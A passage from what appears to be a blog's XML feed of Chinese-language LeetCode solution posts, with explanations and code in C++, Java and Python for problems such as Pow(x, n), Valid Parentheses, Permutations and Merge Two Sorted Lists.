class="comment">//确定棋盘上皇后位置是不是有效的</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">valid_queens</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&amp; board, <span class="keyword">int</span> column, <span class="keyword">int</span> row)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = board.size();</span><br><span class="line">    <span class="comment">//1）x = row (横向)</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="keyword">if</span> (board[row][i]==<span class="string">'Q'</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2) y = col（纵向）：默认true</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//3）col + row = y + x;（反对角线）</span></span><br><span class="line">    <span class="keyword">int</span> s = column + row;</span><br><span class="line">    <span class="keyword">for</span>( <span class="keyword">int</span> i = column - <span class="number">1</span>; i &gt;= <span class="number">0</span> &amp;&amp; s - i &lt; n; i--)</span><br><span class="line">        <span class="keyword">if</span> (board[s-i][i]==<span class="string">'Q'</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//4) col - row = y - x;（对角线）</span></span><br><span class="line">    s = column - row;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = column - <span class="number">1</span>; i &gt;= <span class="number">0</span> &amp;&amp; i - s &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        <span class="keyword">if</span> (board[i-s][i] == <span class="string">'Q'</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Backtracking </tag>
            
            <tag> Leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[50. Pow(x, n)]]></title>
      <url>/wiki/2017/10/30/Leetcode-50-Pow-x-n/</url>
      <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Implement $\text{pow}(x, n)$, which calculates $x$ raised to the power $n$($x^n$).</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 2.00000, 10</span><br><span class="line">Output: 1024.00000</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 2.10000, 3</span><br><span class="line">Output: 9.26100</span><br></pre></td></tr></table></figure>
<p>Example 3:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: 2.00000, -2</span><br><span class="line">Output: 0.25000</span><br><span class="line">Explanation: 2-2 = 1/22 = 1/4 = 0.25</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ul>
<li>$-100.0 &lt; x &lt; 100.0$</li>
<li>$n$ is a 32-bit signed integer, within the range [−$2^{31}$, $2^{31}$ − 1]</li>
</ul>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>最简单的方式当然是$O(n)$的算法，将$x$乘以或者除以$n$次，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">myPow</span><span class="params">(<span class="keyword">double</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x == <span class="number">0</span>) <span class="keyword">return</span> x;</span><br><span class="line">    x = x &gt; <span class="number">0</span> ? x : <span class="number">1.0</span>/x;</span><br><span class="line">    <span class="keyword">double</span> res = x;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) res *= x;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可惜的这种方法超时了，稍微想一想就知道当$n$很大的时候，这种解法肯定是不行的。</p>
<p>另一种方法是使用<a href="http://larryim.cc/wiki/2017/10/30/Algorithm-Divide-and-Conquer/">分治算法</a>，在这里，分治算法的递归公式为</p>
<p>$$x^n = x^{(n/2)} \times x^{(n/2)} \times x^{(n\%2)}$$</p>
<p>最差运行时间$T(n)$用递归表达式表达为</p>
<p>$$T(n) = T(n/2)\times T(n/2) \times T(n\%2) $$</p>
<p>因为$n/2$和$n%2$的最终结果只有0，-1，1三种，所以只考虑这三种base case.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">myPow</span><span class="params">(<span class="keyword">double</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> x;</span><br><span class="line">    <span class="keyword">if</span> (n == -<span class="number">1</span>) <span class="keyword">return</span> <span class="number">1.0</span>/x;</span><br><span class="line">    <span class="keyword">double</span> y = myPow(x, n/<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> y * y * myPow(x, n%<span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面用位操作来计算。考虑$n$的二进制表示. 例如, 如果$n$是 “10001011”, 则 $x^n = x^{1+2+8+128} = x^{1} \times x^{2} \times x^{8} \times x^{128}$. 因此, 我们不用循环$n$次来计算$x^n$. 为了加快计算, 我们遍历$n$中的每一位, 如果第$i$位是1, 我们把结果乘以$x^{2^i} = x^{(1 &lt;&lt; i)}$. 既然 $(1 &lt;&lt; i)$是2的指数, $x^{(1&lt;&lt;(i+1))}$ = square($x^{(1&lt;&lt;i)}$). 这个循环最多执行$\log(n)$次, i.e.$n$的二进制表示中最多有$\log(n)-1$位1).</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">myPow</span><span class="params">(<span class="keyword">double</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> x;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 不能直接 n = -n, 当n = -2147483648</span></span><br><span class="line">        <span class="keyword">if</span> (n == Integer.MIN_VALUE) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span> / myPow(x, Integer.MAX_VALUE) / x;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            x = <span class="number">1.0</span>/x;</span><br><span class="line">            n = -n; <span class="comment">//防止溢出</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">double</span> res = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// n的第i位是1</span></span><br><span class="line">        <span class="keyword">if</span> ((n &amp; <span class="number">1</span>) &gt; <span class="number">0</span>)</span><br><span class="line">            <span class="comment">// res *= x^(1 &lt;&lt; i)</span></span><br><span class="line">            res *= x;</span><br><span class="line">        <span class="comment">// n 右移一位</span></span><br><span class="line">        n &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">        x = x*x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Math </tag>
            
            <tag> Binary Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[20. Valid Parentheses]]></title>
      <url>/wiki/2017/10/30/Leetcode-20-Valid-Parentheses/</url>
      <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given a string containing just the characters <code>(</code>, <code>)</code>, <code>{</code>, <code>}</code>, <code>[</code> and <code>]</code>, determine if the input string is valid.</p>
<p>The brackets must close in the correct order, <code>()</code> and <code>()[]{}</code> are all valid but <code>(]</code> and `([)] are not.</p>
<h2 id="中文题目"><a href="#中文题目" class="headerlink" title="中文题目"></a>中文题目</h2><p>判断一个只包含各种括号符号的字符串中括号的匹配情况。<br>注意点：</p>
<p>字符串中只会包含<code>(</code>, <code>)</code>, <code>[</code>, <code>]</code>, <code>{</code>, <code>}</code>这些字符<br>括号匹配要注意顺序，字符串<code>([)]</code>是错误的匹配<br>例子：</p>
<p>输入: s=”(){}” 输出: True<br>输入: s=”(){}[“ 输出: False</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>典型的用栈来解决的问题，遇到左括号就压栈，遇到右括号时如果栈为空（类似<code>]]]</code>的情况），则失败，否则取栈顶元素，看两个括号是否匹配。如果最后栈不为空（类似<code>[[[</code>的情况），则匹配失败。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isValid</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        chardict = &#123;<span class="string">'('</span>:<span class="string">')'</span>, <span class="string">'['</span>:<span class="string">']'</span>, <span class="string">'&#123;'</span>:<span class="string">'&#125;'</span>&#125;</span><br><span class="line">        n = len(s)</span><br><span class="line">        stack = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">            inchar = s[i]</span><br><span class="line">            <span class="keyword">if</span> (inchar == <span class="string">'('</span>) <span class="keyword">or</span> (inchar == <span class="string">'&#123;'</span>) <span class="keyword">or</span> (inchar ==<span class="string">'['</span>):</span><br><span class="line">                stack.append(inchar)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> len(stack) == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">                outchar = stack.pop()</span><br><span class="line">                <span class="keyword">if</span> inchar != chardict[outchar]:</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> len(stack) &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br></pre></td></tr></table></figure>
<p>Your runtime beats 100.00 % of python3 submissions.</p>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> string </tag>
            
            <tag> stack </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[47. Permutations II]]></title>
      <url>/wiki/2017/10/30/Leetcode-47-Permutations-II/</url>
      <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given a collection of numbers that might contain duplicates, return all possible unique permutations.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,1,2]</span><br><span class="line">Output:</span><br><span class="line">[</span><br><span class="line">  [1,1,2],</span><br><span class="line">  [1,2,1],</span><br><span class="line">  [2,1,1]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>这道题目和46. Permutations基本相同，唯一有区别的地方是排列的数字可能会重复。把结果放在set中，就可以除去重复的结果了。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">permuteUniqueHelper</span><span class="params">(<span class="built_in">set</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; &amp;result, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; chosen)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (nums.size()==<span class="number">0</span>)&#123;</span><br><span class="line">            result.insert(chosen);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::iterator iter=nums.begin(); iter!=nums.end(); iter++)&#123;</span><br><span class="line">                <span class="comment">//choose</span></span><br><span class="line">                <span class="keyword">int</span> s = *iter;</span><br><span class="line">                chosen.push_back(s);</span><br><span class="line">                nums.erase(iter);</span><br><span class="line">            </span><br><span class="line">                <span class="comment">//explore</span></span><br><span class="line">                permuteUniqueHelper(result, nums, chosen);</span><br><span class="line">            </span><br><span class="line">                <span class="comment">//unchoose</span></span><br><span class="line">                chosen.pop_back();</span><br><span class="line">                nums.insert(iter, s);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; permuteUnique(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; chosen;</span><br><span class="line">        <span class="built_in">set</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; result;</span><br><span class="line">        permuteUniqueHelper(result, nums, chosen); </span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; finals(result.begin(), result.end());</span><br><span class="line">        <span class="keyword">return</span> finals;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>另一种方法是先把数组排序，遍历时直接无视重复的数字。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">permuteUniqueHelper</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; &amp;res, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; chosen)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (nums.size()==<span class="number">0</span>)&#123;</span><br><span class="line">            res.push_back(chosen);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::iterator iter=nums.begin(); iter!=nums.end(); iter++)&#123;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>  ((iter!=nums.begin()) &amp;&amp;((*iter)==*(iter<span class="number">-1</span>)))&#123; <span class="comment">//遇到重复时，直接跳过</span></span><br><span class="line">                &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="comment">//choose</span></span><br><span class="line">                    <span class="keyword">int</span> s = *iter;</span><br><span class="line">                    chosen.push_back(s);</span><br><span class="line">                    nums.erase(iter);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//explore</span></span><br><span class="line">                    permuteUniqueHelper(res, nums, chosen);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//unchoose</span></span><br><span class="line">                    chosen.pop_back();</span><br><span class="line">                    nums.insert(iter, s);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; permuteUnique(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; chosen;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">        sort(nums.begin(), nums.end()); <span class="comment">// 1. 排序</span></span><br><span class="line">        permuteUniqueHelper(res, nums, chosen); </span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Backtracking </tag>
            
            <tag> Leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[46. Permutations]]></title>
      <url>/wiki/2017/10/30/Leetcode-46-Permutations/</url>
      <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given a collection of <strong>distinct</strong> integers, return all possible permutations.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,2,3]</span><br><span class="line">Output:</span><br><span class="line">[</span><br><span class="line">  [1,2,3],</span><br><span class="line">  [1,3,2],</span><br><span class="line">  [2,1,3],</span><br><span class="line">  [2,3,1],</span><br><span class="line">  [3,1,2],</span><br><span class="line">  [3,2,1]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>典型的backtracking题目，非常简单。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">permuteHelper</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; &amp;result, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; chosen)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (nums.size()==<span class="number">0</span>)&#123;</span><br><span class="line">            result.push_back(chosen);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::iterator iter=nums.begin(); iter!=nums.end(); iter++)&#123;</span><br><span class="line">                <span class="comment">//choose</span></span><br><span class="line">                <span class="keyword">int</span> s = *iter;</span><br><span class="line">                chosen.push_back(s);</span><br><span class="line">                nums.erase(iter);</span><br><span class="line">            </span><br><span class="line">                <span class="comment">//explore</span></span><br><span class="line">                permuteHelper(result, nums, chosen);</span><br><span class="line">            </span><br><span class="line">                <span class="comment">//unchoose</span></span><br><span class="line">                chosen.pop_back();</span><br><span class="line">                nums.insert(iter, s);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; permute(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; chosen;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; result;</span><br><span class="line">        permuteHelper(result, nums, chosen); </span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Backtracking </tag>
            
            <tag> Leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[21. Merge Two Sorted Lists]]></title>
      <url>/wiki/2017/10/30/Leetcode-21-Merge-Two-Sorted-Lists/</url>
      <content type="html"><![CDATA[<p>Merge two sorted linked lists and return it as a new list. The new list should be made by splicing together the nodes of the first two lists.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Example:</span><br><span class="line"></span><br><span class="line">Input: 1-&gt;2-&gt;4, 1-&gt;3-&gt;4</span><br><span class="line">Output: 1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4</span><br></pre></td></tr></table></figure>
<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><p>合并排过序的链表。采用两个指针分别指向两个链表，依次比较这两个指针所指向的元素。将较小的元素放在最终链表中，并向后移动较小元素对应的链表，直到遍历到链表末尾。 最终，截取剩余的节点到最终链表末尾。</p>
<p>采用循环遍历的方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">mergeTwoLists</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">    ListNode head = <span class="keyword">new</span> ListNode(<span class="number">0</span>), pos = head;</span><br><span class="line">    <span class="keyword">while</span> ((l1!=<span class="keyword">null</span>) &amp;&amp; (l2!= <span class="keyword">null</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (l1.val &lt; l2.val) &#123;</span><br><span class="line">            pos.next = l1;</span><br><span class="line">            l1 = l1.next;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            pos.next = l2;</span><br><span class="line">            l2 = l2.next;</span><br><span class="line">        &#125;</span><br><span class="line">        pos = pos.next;</span><br><span class="line">    &#125;</span><br><span class="line">    pos.next = (l1 == <span class="keyword">null</span>) ? l2 : l1;</span><br><span class="line">    <span class="keyword">return</span> head.next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>采用递归的方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">mergeTwoLists</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// base case</span></span><br><span class="line">    <span class="keyword">if</span> (l1 == <span class="keyword">null</span>) <span class="keyword">return</span> l2;</span><br><span class="line">    <span class="keyword">if</span> (l2 == <span class="keyword">null</span>) <span class="keyword">return</span> l1;</span><br><span class="line">    <span class="comment">// current node</span></span><br><span class="line">    ListNode res;</span><br><span class="line">    <span class="keyword">if</span> (l1.val &lt; l2.val) &#123;</span><br><span class="line">        res = l1;</span><br><span class="line">        l1 = l1.next;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res = l2;</span><br><span class="line">        l2 = l2.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// current node + nodes continued</span></span><br><span class="line">    res.next = mergeTwoLists(l1, l2);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Linked List </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[42. Trapping Rain Water]]></title>
      <url>/wiki/2017/10/30/Leetcode-42-Trapping-Rain-Water/</url>
      <content type="html"><![CDATA[<p>Given $n$ non-negative integers representing an elevation map where the width of each bar is 1, compute how much water it is able to trap after raining.</p>
<p>For example,<br>Given <code>[0,1,0,2,1,0,1,3,2,1,2,1]</code>, return 6.</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15155537901830.png" alt=""></p>
